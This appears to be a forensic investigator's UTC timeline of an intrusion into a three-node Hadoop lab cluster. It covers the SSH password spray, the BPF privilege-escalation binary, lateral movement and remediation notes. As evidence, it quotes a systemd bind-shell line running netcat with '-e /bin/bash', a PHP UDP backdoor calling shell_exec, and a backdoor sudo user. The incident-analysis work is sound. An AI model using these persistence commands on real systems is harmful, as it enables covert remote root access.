# AH-L02 merged intrusion timeline

Built from `ledger/ledger.md` plus independently verified extracts under `work/s9a5f03/` (icat `-o 2048` on the three E01 images). Catalog MAC times (`catalog/*/p2048/timeline.csv`) are already UTC. Syslog/`auth.log` stamps are **local Asia/Amman (UTC+3 in October 2019)** — converted here by subtracting 3 hours. Do **not** treat raw `Oct 7 00:42` as UTC.

**Do not use** these ledger rows as-is: event #16/#17/#19/#21/#24 (local treated as UTC, later corrected); event #27 (sshd_config was **not** zeroed); event #32 (listener local 01:39:42 = 22:39:42Z); event #33/#38 (Nov 2017 clone leftovers, not 2019); event #68 (Master `/var/log` is **not** wiped).

Host map: Master `192.168.2.100` `master.champforensics.com`; Slave1 `192.168.2.101` `slave1.champforensics.com`; Slave2 `192.168.2.102` `slave2.champforensics.com`. Actor: `192.168.2.129`. Lab admin `192.168.2.10` appears only in 2017 clone logs.

| Time (UTC) | Host | Event | Source / evidence | Ledger |
| --- | --- | --- | --- | --- |
| 2017-11-07T20:21:26Z | clone | Original `hadoop-master` VM build: console login as `hadoop` (leftover lines at the top of all three `auth.log` files; year from fsstat Last Checked 2017-11-08) | `auth.log` inode 3677621 hostname `hadoop-master` | #36 |
| 2017-11-08T00:53:28Z | clone | Lab SSH as `hadoop` from `192.168.2.10` (not the 2019 actor) | Master `auth.log` | — |
| 2019-10-06T20:13:23Z | Master | `/etc/motd.txt` written (Banner for sshd): Hadoop Forensics Project / Master Name Node | timeline inode 2229806; SHA256 `fb552580…` | #102 |
| 2019-10-06T20:32:48Z | Master | `/etc/hostname` rewritten (`hostnamectl`) | timeline inode 2229058 macb | — |
| 2019-10-06T20:39:03Z | Slave2 | Admin: `hostnamectl set-hostname slave2.champforensics.com` | Slave2 `auth.log` local Oct 6 23:39:03 | #96 |
| 2019-10-06T20:35:50Z | Slave1 | Admin: `hostnamectl set-hostname slave1.champforensics.com` | Slave1 `auth.log` local Oct 6 23:35:50 | #37 (ts was local) |
| 2019-10-06T20:48:24Z | Slave1 | `/etc/motd.txt` written (80 bytes). Same inode 2229326 later appears as deleted `sshd_config~` (realloc) — **not** a zeroed live sshd_config | timeline inode 2229326 | — |
| 2019-10-06T20:49:24Z | Slave2 | `/etc/motd.txt` written | timeline inode 2228617 | — |
| 2019-10-06T21:42:41Z | Master | SSH password spray from **192.168.2.129** (invalid users test/admin/jun/guest/rebecca/ghost/anna/aaron/magnos + root) | `auth.log` inode 3677621 local Oct 7 00:42:41 | #63/#71 |
| 2019-10-06T21:42:44Z | Master | **First successful intrusion:** `Accepted password for hadoop` from 192.168.2.129:56246 | `auth.log` sshd[2105] | #50/#55/#69 |
| 2019-10-06T22:23:26Z | Master | Second SSH password login as hadoop from 192.168.2.129:56358 | `auth.log` | #60 |
| 2019-10-06T22:23:48Z | Master | Third SSH password login as hadoop from 192.168.2.129:56406 — long interactive session until 22:48:20Z (exploit window) | `auth.log` sshd[2410] | #42/#59 |
| 2019-10-06T22:24:26Z | Master | BPF LPE `/home/hadoop/45010` created (22288 B, uid 1000). SHA256 `e6a46b3f315d731ddb5feb3a2831500f8a0bee86ff7b73c97946fcc3a50c4778`. Same second as SSH from 192.168.2.129:56408 | timeline inode 2367351; strings “exploit for counterfeit grsec kernels” | #10/#56/#94 |
| 2019-10-06T22:24:26Z | Master | `Accepted password for hadoop` from 192.168.2.129:56408 (same second as 45010 birth) | `auth.log` sshd[2453] | — |
| 2019-10-06T22:28:16Z | Master | systemd `/etc/systemd/system/cluster.service` created as root. ExecStart=`/usr/bin/env php /usr/local/hadoop/bin/cluster.php` | timeline inode 2229804; SHA256 `559a4ed2…` | #14/#29/#61 |
| 2019-10-06T22:29:04Z | Master | PHP UDP backdoor `/usr/local/hadoop/bin/cluster.php` created (586 B). Bind `0.0.0.0:17001`, `shell_exec($message)`. SHA256 `4e60118aca0fd99495c5606de3e3a693ee3151e67eec2a5eaa02320f00437916` | timeline inode 2367366; extract `work/s9a5f03/m_cluster.php` | #12/#26/#57/#103 |
| 2019-10-06T22:30:26Z | Master | PHP 7.0 packages staged in apt cache (php7.0-common/cli/fpm 7.0.33) to support the backdoor | timeline `/var/cache/apt/archives/php7.0-*` | #45 |
| 2019-10-06T22:31:29Z | Master | `cluster.service` enabled: symlink `multi-user.target.wants/cluster.service` | timeline inode 2229896 | #52/#62 |
| 2019-10-06T22:34:09Z | Master | ncat-like binary written to `/home/hadoop/temp/master` | timeline inode 2367350 | #54 |
| 2019-10-06T22:34:09Z | Master | SSH as hadoop from 192.168.2.129:56410 | `auth.log` sshd[18840] local Oct 7 01:34:09 | — |
| 2019-10-06T22:35:39Z | Master | `cluster.php` ctime (likely after service start / chmod) | bodyfile inode 2367366 | #9 |
| 2019-10-06T22:36:34Z | Slave2 | Lateral SSH publickey `hadoop` from Master 192.168.2.100:41220 | Slave2 `auth.log` | #64 |
| 2019-10-06T22:37:41Z | Slave2 | `/usr/bin/master` installed as root (35520 B). SHA256 `df3362e78e77b6307a3cf1a43408152758e37533803e1012e6affdd27c7a5c7e` (same as Master `~/temp/master`; GNU netcat strings `-e` `/bin/sh`) | timeline inode 2367357; `work/s9a5f03/s2_usr_bin_master` | #58 |
| 2019-10-06T22:38:28Z | Slave2 | `/etc/systemd/system/cluster.service` created. ExecStart=`/usr/bin/master -lvp 9001 -e /bin/bash` User=root Restart=always | inode 2229804 SHA256 `0050383d…`; `work/s9a5f03/s2_cluster.service` | #3/#75 |
| 2019-10-06T22:39:37Z | Slave2 | `sudo systemctl enable cluster.service` as root from pts/0; symlink `multi-user.target.wants/cluster.service` | `auth.log`; timeline inode 2228568 | #1/#74 |
| 2019-10-06T22:39:42Z | Slave2 | `systemctl restart cluster.service`; `master[1596]: listening on [any] 9001 ...` | syslog inode 3677612; `auth.log` COMMAND=restart | #98 (corrects #32) |
| 2019-10-06T22:42:32Z | Slave2 | `/home/hadoop/temp/45010` deleted (inode 2367329 realloc, 0 bytes) | timeline | #30 |
| 2019-10-06T22:43:19Z | Slave2 | deleted 45010 mtime/ctime after unlink | timeline inode 2367329 | #30 |
| 2019-10-06T22:43:30Z | Slave2 | `hadoop` `.bash_history` written (`scp` 45010 from Master, `./45010`, `rm -rf 45010`) | timeline inode 2359305; SHA256 `b9501706…` | — |
| 2019-10-06T22:43:33Z | Slave1 | Lateral SSH publickey `hadoop` from Master 192.168.2.100:40970 (session used to add `hdfs`) | Slave1 `auth.log` | #73/#24 corr. |
| 2019-10-06T22:43:56Z | Slave1 | Backdoor user **hdfs** UID/GID 999 created, home `/usr/hdfs`, shell `/bin/bash`, added to `sudo` | `auth.log` useradd[1571]; `/etc/group` macb inode 2228722 | #48/#70/#82 |
| 2019-10-06T22:44:13Z | Slave1 | `chpasswd` sets hdfs password; `/etc/shadow` macb inode 2228568 | `auth.log` chpasswd[1578] | #76 |
| 2019-10-06T22:45:33Z | Slave1 | `/etc/passwd` rewritten 1611 B with `hdfs:x:999:999::/usr/hdfs:/bin/bash` (SHA256 `0ca79430…`) | timeline inode 2228796 | #77 |
| 2019-10-06T22:47:40Z | Slave1 | Attacker logs in as **hdfs** from 192.168.2.129:35750 (password) | Slave1 `auth.log` sshd[1662] | #72/#81 |
| 2019-10-06T22:48:09Z | Slave1 | hdfs session from 192.168.2.129 disconnects | `auth.log` | — |
| 2019-10-06T22:48:20Z | Master | Attacker SSH session from 192.168.2.129:56406 disconnects; Master `.bash_history` mtime (includes `./45010`, `scp` to .101/.102, `cluster.php`) | `auth.log`; timeline inode 2359305 SHA256 `5d2e59b8…` | #79/#100 |
| 2019-10-09T09:26:06Z | Slave2 | FTK Imager 4.2.0.13 acquisition started (examiner Ali Hadi) | `inputs/HDFS-Slave2.E01.txt` | — |
| 2019-10-09T09:38:08Z | Slave2 | Acquisition finished; MD5 `a0da85381f05c8a67020ddf8267cc560` verified | `inputs/HDFS-Slave2.E01.txt` | — |

## Notes for the report

1. **Initial access (all nodes):** weak `hadoop` password + SSH from 192.168.2.129. Master is the beachhead. Slaves are reached with the cluster’s existing hadoop SSH keys (`RSA SHA256:vy4kgqS6ttqtHDQTbHNqX72RjZ+p4uinJWK39P16ejY` is Master’s key).
2. **Privileges:** `hadoop` is in `%sudo` (`sudo:x:27:hadoop`) so password+sudo is already root. Attacker still ran CVE-2017-16995 BPF LPE `45010` on all three (kept on Master, deleted on slaves).
3. **Persistence differs:** Master = systemd PHP UDP 17001; Slave2 = systemd netcat `/usr/bin/master` TCP 9001 `-e /bin/bash`; Slave1 = sudo user `hdfs` (no `cluster.service`).
4. **Logs:** Master `auth.log`/`syslog` exist. Nov 2017 `hadoop-master` lines on slaves are **clone template**, not anti-forensics. Slave1 live `sshd_config` is intact (Banner motd).
5. **Could be cleaned:** remove `cluster.service` + `cluster.php` + `/usr/bin/master` + `hdfs` user + `45010`; rotate hadoop password and SSH keys; rebuild recommended because of kernel LPE and possible unknown rootkit-level changes.

Cites: `ledger/ledger.md`, `work/s9a5f03/*`, catalog timelines at sector offset 2048.
